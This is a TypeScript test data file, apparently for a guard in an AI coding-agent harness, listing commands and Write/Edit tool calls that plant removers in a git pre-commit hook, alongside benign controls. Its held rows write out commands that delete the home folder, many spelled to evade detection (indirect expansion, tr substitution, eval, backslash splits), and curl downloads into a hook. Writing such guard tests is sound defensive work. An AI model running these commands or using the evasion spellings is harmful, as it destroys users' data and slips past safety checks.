import type { Group, Row } from "./_shared"

// #2245: a git hook written with a remover word, whatever its target, since a hook learns its targets only when it runs: an in-place sed's or perl's script, a printer's, cat's or tee's text, a file tool's text, a program built from a variable or a substitution or an eval in that text, and text the hook cannot read, each judged the same from every working folder; rows are data, as refused-forms.ts says.
const held = (): Row[] => [
  [
    "an in-place sed that writes a bare cd and a remover of its folder into a git hook",
    "sed -i '' 's/a/cd; rm -rf $PWD/' .git/hooks/pre-commit",
  ],
  [
    "an in-place sed that writes a bare cd and a remover of pwd's folder into a git hook",
    "sed -i '' 's/a/cd; rm -rf $(pwd)/' .git/hooks/pre-commit",
  ],
  [
    "an in-place sed that writes a cd to / and a remover of a glob into a git hook",
    String.raw`sed -i '' 's/a/cd \/; rm -rf */' .git/hooks/pre-commit`,
  ],
  [
    "an in-place sed that writes a bare cd and a remover of the dot into a git hook",
    String.raw`sed -i '' 's/a/cd \&\& rm -rf ./' .git/hooks/pre-commit`,
  ],
  [
    "an in-place sed that writes a cd home and a remover of the dot into a git hook",
    String.raw`sed -i '' 's/a/cd ~\/. \&\& rm -rf ./' .git/hooks/pre-commit`,
  ],
  [
    "an in-place sed that writes a remover of a nested echo of the home into a git hook",
    "sed -i '' 's/a/rm -rf $(echo $(echo ~))/' .git/hooks/pre-commit",
  ],
  [
    "an in-place sed that writes a remover of printenv's home into a git hook",
    "sed -i '' 's/a/rm -rf $(printenv HOME)/' .git/hooks/pre-commit",
  ],
  [
    "an in-place sed that writes a remover of an indirect expansion into a git hook",
    "sed -i '' 's/a/x=HOME; rm -rf ${!x}/' .git/hooks/pre-commit",
  ],
  [
    "an in-place sed that writes a remover of a cd -P and pwd pair into a git hook",
    "sed -i '' 's/a/rm -rf $(cd -P; pwd)/' .git/hooks/pre-commit",
  ],
  [
    "an in-place sed that writes rimraf of the home into a git hook",
    "sed -i '' 's/a/rimraf ~/' .git/hooks/pre-commit",
  ],
  [
    "an in-place sed that writes a remover of the home echoed with a trailing dot into a git hook",
    String.raw`sed -i '' 's/a/rm $(echo ~\/.)/' .git/hooks/pre-commit`,
  ],
  [
    "an in-place perl that writes a remover of printenv's home into a git hook",
    String.raw`perl -pi -e 's/a/rm -rf \$(printenv HOME)/' .git/hooks/pre-commit`,
  ],
  [
    "an echo of a remover of printenv's home redirected into a git hook",
    "echo 'rm -rf $(printenv HOME)' > .git/hooks/pre-commit",
  ],
  [
    "a printf of a bare cd and a remover of its folder appended to a git hook",
    String.raw`printf 'cd; rm -rf $PWD\n' >> .git/hooks/pre-commit`,
  ],
  ["an echo of rimraf piped into a git hook by tee", "echo 'rimraf ~' | tee .git/hooks/pre-commit"],
  [
    "an echo of a remover in upper case redirected into a git hook",
    "echo 'RM -rf $(printenv HOME)' > .git/hooks/pre-commit",
  ],
  [
    "an echo of a remover spelled with a backslash redirected into a git hook",
    String.raw`echo 'r\m -rf $(printenv HOME)' > .git/hooks/pre-commit`,
  ],
  [
    "an echo of shred redirected into a git hook",
    "echo 'shred -u $(printenv HOME)/x' > .git/hooks/pre-commit",
  ],
  [
    "an echo of a find -delete redirected into a git hook",
    "echo 'find $(printenv HOME) -delete' > .git/hooks/pre-commit",
  ],
  [
    "an echo of trash in a brace group redirected into a git hook",
    "{ echo '#!/bin/sh'; echo 'trash ~'; } > .git/hooks/pre-commit",
  ],
  [
    "a heredoc of a remover of printenv's home fed to cat into a git hook",
    "cat > .git/hooks/pre-commit <<'EOF'\nrm -rf $(printenv HOME)\nEOF",
  ],
  [
    "a heredoc of a remover of the data folder fed to cat into a git hook",
    "cat > .git/hooks/pre-commit <<'EOF'\nrm -rf ~/.playground/extensions/.no-such-folder\nEOF",
  ],
  [
    "a here-string of a remover fed to cat - into a git hook",
    "cat - > .git/hooks/pre-commit <<< 'rm $(printenv HOME)'",
  ],
  [
    "a heredoc of a remover fed to tee into a git hook",
    "tee .git/hooks/pre-commit <<'EOF'\nrm -rf $(printenv HOME)\nEOF",
  ],
  [
    "an echo of a program built from a variable redirected into a git hook",
    "echo '$X -rf $(printenv HOME)' > .git/hooks/pre-commit",
  ],
  [
    "an echo of a program built from a default expansion redirected into a git hook",
    "echo '${RM:-r}m -rf $(printenv HOME)' > .git/hooks/pre-commit",
  ],
  [
    "a printf of a program spelled by an ANSI-C string redirected into a git hook",
    String.raw`printf '%s\n' "\$'\\x72m' -rf ~" > .git/hooks/pre-commit`,
  ],
  [
    "an echo of a program built from a substitution redirected into a git hook",
    "echo '`echo cm | tr c r` -rf ~' > .git/hooks/pre-commit",
  ],
  ["an echo of an eval redirected into a git hook", `echo 'eval "$CMD"' > .git/hooks/pre-commit`],
  [
    "an in-place sed that writes a program built from a substitution into a git hook",
    "sed -i '' 's/a/$(echo cm | tr c r) -rf ~/' .git/hooks/pre-commit",
  ],
  ["an in-place sed whose script is a file", "sed -i '' -f /tmp/s.sed .git/hooks/pre-commit"],
  ["an in-place sed whose script is a variable", `sed -i '' "$S" .git/hooks/pre-commit`],
  ["an in-place perl whose script is a file", "perl -i /tmp/s.pl .git/hooks/pre-commit"],
  ["an echo of a variable redirected into a git hook", `echo "$X" > .git/hooks/pre-commit`],
  [
    "an in-place perl whose script is a file, with a backup suffix holding an e",
    "perl -i.save /tmp/s.pl .git/hooks/pre-commit",
  ],
  [
    "an in-place perl whose script is a file, after a module option holding an e",
    "perl -MFile::Spec -i /tmp/s.pl .git/hooks/pre-commit",
  ],
  [
    "an in-place GNU sed whose script is a file named by a prefix of --file",
    "gsed -i --fil=/tmp/s.sed .git/hooks/pre-commit",
  ],
  [
    "an in-place macOS sed whose script is a file, after an -a in its -f cluster",
    "sed -i '' -af /tmp/s.sed .git/hooks/pre-commit",
  ],
  [
    "an in-place macOS sed by -I whose script is a file, after an -a in its -f cluster",
    "sed -I '' -af /tmp/s.sed .git/hooks/pre-commit",
  ],
  [
    "an in-place GNU sed whose script is a file, after a -b in its -f cluster",
    "gsed -i -bf /tmp/s.sed .git/hooks/pre-commit",
  ],
  [
    "an in-place perl whose script is a file, after a -F pattern holding an e",
    "perl -i -Fe /tmp/s.pl .git/hooks/pre-commit",
  ],
  [
    "an echo of a glob of the data folder into a git hook named through /dev/..",
    "echo 'touch ~/.play*/extensions/x' > /dev/../tmp/r/.git/hooks/pre-commit",
  ],
  [
    "a download redirected into a git hook",
    "curl -s https://example.com/h > .git/hooks/pre-commit",
  ],
  [
    "a download piped into a git hook by tee",
    "curl -s https://example.com/h | tee .git/hooks/pre-commit",
  ],
  [
    "a Write of a remover split by a backslash-newline into a git hook",
    {
      input: { content: "r\\\nm old.log\n", file_path: ".git/hooks/pre-commit" },
      tool: "Write",
    },
  ],
  [
    "a heredoc of a remover split by a backslash-newline fed to cat into a git hook",
    "cat > .git/hooks/pre-commit <<'EOF'\nr\\\nm old.log\nEOF",
  ],
  [
    "a Write of a remover after a comment that holds a patch header into a git hook",
    {
      input: { content: "# *** Begin Patch\nrm old.log\n", file_path: ".git/hooks/pre-commit" },
      tool: "Write",
    },
  ],
  [
    "a Write of a remover after a comment that ends at a backslash into a git hook",
    {
      input: { content: "# note\\\nrm old.log\n", file_path: ".git/hooks/pre-commit" },
      tool: "Write",
    },
  ],
  [
    "a heredoc of a remover after a comment that ends at a backslash fed to cat into a git hook",
    "cat > .git/hooks/pre-commit <<'EOF'\n# note\\\nrm old.log\nEOF",
  ],
  [
    "a Write of a program named by a glob of its path into a git hook",
    {
      input: { content: "/bin/r? old.log\n", file_path: ".git/hooks/pre-commit" },
      tool: "Write",
    },
  ],
  [
    "a Write of a remover of printenv's home into a git hook",
    {
      input: { content: "rm -rf $(printenv HOME)\n", file_path: ".git/hooks/pre-commit" },
      tool: "Write",
    },
  ],
  [
    "an Edit that writes a remover into a git hook",
    {
      input: {
        file_path: ".git/hooks/pre-commit",
        new_string: "cd; rm -rf $PWD",
        old_string: "bun test",
      },
      tool: "Edit",
    },
  ],
  [
    "a MultiEdit that writes a program built from a variable into a git hook",
    {
      input: {
        edits: [{ new_string: "$X ~", old_string: "bun test" }],
        file_path: ".git/hooks/pre-commit",
      },
      tool: "MultiEdit",
    },
  ],
]
// controls that keep canary's verdict: a hook written with no remover, a remover written into a file no shell runs as a hook, a remover in a comment of such a file, and text the hook cannot read written anywhere but a hook
const controls = (): Row[] => [
  [
    "an echo of a plain command redirected into a git hook",
    "echo 'bun test' > .git/hooks/pre-commit",
  ],
  [
    "an echo of a plain command piped into a git hook by tee",
    "echo 'bun test' | tee .git/hooks/pre-commit",
  ],
  [
    "a heredoc of a hook that runs lefthook fed to cat into a git hook",
    `cat > .git/hooks/pre-commit <<'EOF'\n#!/bin/sh\nexec bunx lefthook run pre-commit "$@"\nEOF`,
  ],
  [
    "an in-place sed that renames a word in a git hook",
    "sed -i '' 's/pre-commit/pre-push/' .git/hooks/pre-push",
  ],
  [
    "an echo of a remover of printenv's home redirected into a note",
    "echo 'rm -rf $(printenv HOME)' > notes.sh",
  ],
  [
    "an echo of a remover word in a comment redirected into a note",
    "echo '# rm -rf old build' > notes.sh",
  ],
  [
    "an in-place sed that writes a remover of printenv's home into a note",
    "sed -i '' 's/a/rm -rf $(printenv HOME)/' notes.sh",
  ],
  [
    "a heredoc of a remover of printenv's home fed to cat into a note",
    "cat > notes.sh <<'EOF'\nrm -rf $(printenv HOME)\nEOF",
  ],
  ["a here-string of a remover fed to tee into a note", "tee notes.txt <<< 'rm $(printenv HOME)'"],
  [
    "an in-place perl -lne whose script is its -e, on a git hook",
    "perl -i -lne 'print' .git/hooks/pre-commit",
  ],
  [
    "an in-place perl -ane with a -F pattern, on a git hook",
    "perl -i -F: -ane 'print' .git/hooks/pre-commit",
  ],
  [
    "an in-place perl with a backup suffix and a -pe script, on a git hook",
    "perl -i.bak -pe 's/pre-commit/pre-push/' .git/hooks/pre-commit",
  ],
  [
    "an in-place GNU sed whose script is a prefix of --expression, on a git hook",
    "gsed -i --expr='s/pre-commit/pre-push/' .git/hooks/pre-commit",
  ],
  [
    "an in-place GNU sed that follows links, on a git hook",
    "gsed -i --follow-symlinks 's/pre-commit/pre-push/' .git/hooks/pre-commit",
  ],
  [
    "a read-only sed whose script file is attached to its -f, on a git hook",
    "sed -f/tmp/fix.sed .git/hooks/pre-commit",
  ],
  [
    "an in-place sed whose attached -e script holds an f, on a git hook",
    "sed -i -es/pre-commit/pre-fetch/ .git/hooks/pre-commit",
  ],
  ["a test run's output redirected into a log", "bun test > out.log 2>&1"],
  ["an echo of a variable redirected into a note", `echo "$X" > notes.txt`],
  ["an in-place sed whose script is a file, on a note", "sed -i '' -f s.sed notes.txt"],
  ["a download redirected into /dev/null", "curl -s https://example.com > /dev/null"],
  [
    "a Write of a remover into a note",
    { input: { content: "rm -rf $(printenv HOME)\n", file_path: "notes.sh" }, tool: "Write" },
  ],
  [
    "a Write of a remover word in a comment into a note",
    { input: { content: "// rm the old build\n", file_path: "notes.ts" }, tool: "Write" },
  ],
  [
    "a Write of a command split by a backslash-newline into a git hook",
    {
      input: { content: "bun \\\n  test\n", file_path: ".git/hooks/pre-commit" },
      tool: "Write",
    },
  ],
  [
    "a Write of a quoted program path holding a glob character into a git hook",
    {
      input: { content: "'/opt/tool?/run' --check\n", file_path: ".git/hooks/pre-commit" },
      tool: "Write",
    },
  ],
  [
    "a Write of a test and a glob argument into a git hook",
    {
      input: { content: "[ -f .env ] && ls *.log\n", file_path: ".git/hooks/pre-commit" },
      tool: "Write",
    },
  ],
  [
    "a Write of a plain command into a git hook",
    {
      input: { content: "#!/bin/sh\nbun test\n", file_path: ".git/hooks/pre-commit" },
      tool: "Write",
    },
  ],
]

const rows = () => [...held(), ...controls()]

export const groups: Group[] = [
  { folders: ["data folder", "home", "process worktree"], guards: ["no-extensions-write"], rows },
]

export const allowed: string[] = controls().map(([what]) => what)
